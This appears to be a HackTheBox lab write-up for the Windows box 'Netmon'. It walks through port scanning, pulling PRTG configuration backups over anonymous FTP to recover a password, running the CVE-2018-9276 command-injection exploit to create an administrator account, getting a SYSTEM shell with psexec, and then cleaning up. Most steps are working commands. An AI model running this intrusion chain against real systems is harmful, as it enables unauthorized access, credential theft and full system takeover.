---
tags:
  - HTB
  - Netmon
  - Windows
  - FTP
  - PRTG
  - CVE-2018-9276
  - RCE
  - Easy
platform: HackTheBox
os: Windows
hostname: NETMON
domain: None
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Netmon, Full Walkthrough

## The gist

Netmon is a standalone Windows machine running PRTG Network Monitor. Anonymous FTP exposes the Windows filesystem, including old PRTG configuration backups. A stale backup password gives access to PRTG, and CVE-2018-9276 lets us create an administrator account through the authenticated notification feature. PRTG is running as SYSTEM, so the resulting shell is already fully privileged.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows |
| Hostname | NETMON |
| Domain | Standalone host |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxset WebPort 80
boxset Domain netmon
boxset Username prtgadmin
boxset Password $Password
boxset Username2 pentest
boxset Password2 $Password2
boxset AdminUser Administrator
```

## 1. Workspace setup

I started the box and loaded the workspace details.

```bash
boxstart Netmon $BoxIP htb
htblog
```

## 2. Full TCP scan

Before checking versions, scan every TCP port. A fast scan of only common ports could miss an unusual management service.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/allports
```

`-Pn` skips ping discovery, which helps when the host does not answer ICMP. `-n` skips DNS lookups. `-sS` performs a half-open TCP SYN scan. `--min-rate 5000` asks Nmap to send probes quickly. The scan found FTP, HTTP, SMB, WinRM, RPC, and dynamic RPC ports.

> [!tip] ⚡ More efficient path
> **What we did:** Ran a full port scan and then a service scan against only the ports we noticed later.
>
> **Faster approach:**
> ```bash
> sudo nmap -sC -sV -p 21,80,135,139,445,5985,47001,49664-49669 $BoxIP -oA $BoxDir/nmap/services
> ```
> **Why:** Once the full scan has returned, this checks every discovered service in one targeted command instead of leaving the dynamic RPC ports for a later pass.

## 3. Service scan

The full scan gave us ports. Now identify what is actually listening on them.

```bash
sudo nmap -sC -sV -p 21,80,135,139,445,5985,47001 $BoxIP -oA $BoxDir/nmap/services
```

The important results were Microsoft FTP with anonymous access, PRTG 18.1.37.13946 on HTTP, SMB, and WinRM. The FTP script output listed paths such as `inetpub`, `ProgramData`, `Users`, and `Windows`. That means the FTP root exposes the Windows filesystem rather than a small isolated folder. PRTG is network monitoring software, and its configuration is commonly stored below `ProgramData`.

## 4. FTP enumeration

Anonymous FTP is the first useful access path. I checked the PRTG directory and downloaded both backup configurations.

```bash
curl -s ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/

curl -s -o $BoxDir/loot/PRTG_Configuration.old.bak \
  "ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old.bak"

curl -s -o $BoxDir/loot/PRTG_Configuration.old \
  "ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old"
```

The directory contained the live `.dat` file and older `.old` and `.old.bak` copies. The oldest backup is especially useful because it can preserve credentials that were later changed.

The FTP enumeration approach is also covered in [HackTricks FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp).

## 5. Credential recovery

I searched the old backup for the PRTG administrator entry.

```bash
grep -A 1 "User: prtgadmin" $BoxDir/loot/PRTG_Configuration.old.bak
```

The result contained a cleartext backup password. Because the backup was created in an earlier year and the box was configured later, I tested the year-incremented variant rather than assuming the old value was still current.

## 6. Exploit search

The service version is old enough to check for a known authenticated exploit.

```bash
searchsploit PRTG
```

This identified Exploit-DB entry 46527 for CVE-2018-9276. The vulnerable PRTG notification action passes an `Execute Program` parameter into PowerShell without safely handling command input, which allows authenticated command injection.

Reference: [Exploit-DB 46527](https://www.exploit-db.com/exploits/46527)

## 7. PRTG authentication

The PRTG login endpoint accepts the recovered account and redirects a successful login to the welcome page. I saved the session cookie for the exploit.

```bash
boxset Username prtgadmin
boxset Password $Password
loot cred $Username $Password

curl -s -L -c $BoxDir/loot/cookies.txt \
  -o $BoxDir/loot/dashboard.htm \
  -w "login_status=%{http_code}\nfinal_url=%{url_effective}\n" \
  -d "username=$Username&password=$Password&loginurl=" \
  http://$BoxIP:$WebPort/public/checklogin.htm
```

The login status was successful and the final URL was `welcome.htm`. `checklogin.htm` processes the submitted credentials. The redirect confirms that the session was accepted.

> [!tip] ⚡ More efficient path
> **What we did:** Used a curl request and saved the response while checking the redirect.
>
> **Faster approach:**
> ```bash
> curl -s -L -c $BoxDir/loot/cookies.txt -o /dev/null -w "%{http_code}\n%{url_effective}\n" -d "username=$Username&password=$Password&loginurl=" http://$BoxIP:$WebPort/public/checklogin.htm
> ```
> **Why:** `-w` prints only the status and final URL, so there is no need to parse the full dashboard page just to confirm authentication.

## 8. Cookie extraction

The cookie file uses Netscape format. HTTPOnly cookies appear on lines beginning with `#HttpOnly_`, so a basic parser can mistake them for comments. I removed the leading comment marker and joined the cookie fields.

```bash
Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
echo "Cookie extracted"
```

> [!warning] 💡 Hint
> **Watch out:** The HTTPOnly cookie is stored on a `#HttpOnly_` line. Treating every line beginning with `#` as a comment can silently produce an empty cookie, so the `awk` command removes only that prefix before reading the fields.

## 9. Exploit staging

I copied the known exploit into the workspace and ran it with the authenticated cookie.

```bash
searchsploit -m 46527
mv 46527.sh $BoxDir/exploits/
bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
```

The exploit created a temporary user, added it to the administrators group, and fired the notification actions. Mechanically, it uses the vulnerable notification API to execute commands such as `net user` and `net localgroup`.

> [!warning] 💡 Hint
> **Watch out:** Each exploit run creates three notification objects. If you run it twice, expect six objects to remove during cleanup. The API can report success while leaving those objects behind.

## 10. Validate the new administrator

Before opening a shell, validate that the temporary account is accepted over SMB.

```bash
boxset Username2 pentest
boxset Password2 $Password2
loot cred $Username2 $Password2
netexec smb $BoxIP -u $Username2 -p $Password2
```

NetExec reported the account as usable and marked it `Pwn3d!`, meaning the credentials provide administrative execution access.

## 11. SYSTEM shell and flags

I used PsExec to upload a temporary service executable, create a Windows service, and start it. The service runs as the local SYSTEM account, so this does not need a separate privilege escalation step.

Reference: [HackTricks PsExec](https://book.hacktricks.xyz/windows-hardening/ntlm/psexec)

```bash
psexec.py $Domain/$Username2:$Password2@$BoxIP
```

```cmd
whoami
type C:\Users\Public\Desktop\user.txt
type C:\Users\$AdminUser\Desktop\root.txt
loot flag user $UserFlag
loot flag root $RootFlag
```

`whoami` confirmed `nt authority\\system`. Check both flag paths privately and record only their locations in your notes.

Flag breakdown:

- User flag: confirmed at the public Desktop path, value omitted.
- Root flag: confirmed at the Administrator Desktop path, value omitted.

> [!warning] 💡 Hint
> **Watch out:** This is a Windows command shell. Use `dir` instead of `ls`, and `type` instead of `cat`.

![[netmon-11-system-flags.png]]
SCREENSHOT: SYSTEM shell and both flag paths confirmed

## 12. Clean-down

Delete the file created by the exploit before deleting the temporary account. The account is needed for SMB or WMI access during cleanup.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
netexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"
```

The verification returned `GONE`. Now remove the temporary account and verify that it can no longer authenticate.

Reference: [Paessler PRTG object manipulation](https://www.paessler.com/manuals/prtg/object_manipulation)

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user $Username2 /delete"
netexec smb $BoxIP -u $Username2 -p $Password2
```

The final authentication check failed, confirming account removal. PRTG requires `approve=1` for deletion, so I removed the six temporary notification objects and then listed the remaining objects. Built-in objects such as 300, 301, and 302 must remain.

```bash
for NotificationId in 2024 2025 2026 2027 2028 2029; do
  curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$NotificationId&approve=1"
  echo "temporary notification deleted"
done

curl -s -b "$Cookie" "http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name,active"
boxdone
rm -rf $BoxDir
```

> [!warning] 💡 Hint
> **Watch out:** Delete `tester.txt` while the temporary administrator still works. Removing the account first can prevent you from cleaning up the file. Also include `approve=1`, because `deleteobject.htm` otherwise silently does nothing.

> [!tip] ⚡ More efficient path
> **What we did:** Used a for loop to send one deletion request per notification ID.
>
> **Slower alternative:**
> ```bash
> curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=2024&approve=1"
> curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=2025&approve=1"
> # ... repeated for every ID
> ```
> **Why:** The for loop removes all six objects in a single block without repeating the command manually for each ID.

## Credentials

| Account | Source | Use |
|---|---|---|
| `prtgadmin` | PRTG configuration backup | Authenticate to PRTG |
| `pentest` | Authenticated PRTG command injection | SMB validation and PsExec |

Passwords are intentionally omitted.

## Key lessons

- Anonymous FTP can expose the complete Windows filesystem. Always inspect application paths under `ProgramData`.
- Old application backups may contain cleartext credentials that no longer match the live password. Test a small, evidence-based variation first.
- PRTG notification actions can turn authenticated access into command execution.
- Delete files before deleting the account that gives you access to remove them.
- PRTG notification cleanup needs `approve=1`, and temporary objects must be distinguished from built-ins.
- [ippsec Netmon walkthrough](https://ippsec.rocks/?#Netmon)

## Checklist

- [x] Full TCP scan completed
- [x] Service and version enumeration completed
- [x] Anonymous FTP filesystem access confirmed
- [x] PRTG backup configuration downloaded
- [x] PRTG credentials recovered and validated
- [x] Authenticated command injection completed
- [x] SYSTEM shell confirmed
- [x] User and root flag paths confirmed privately
- [x] Temporary file, account, and notification objects removed
- [x] Cleanup verified and `boxdone` run
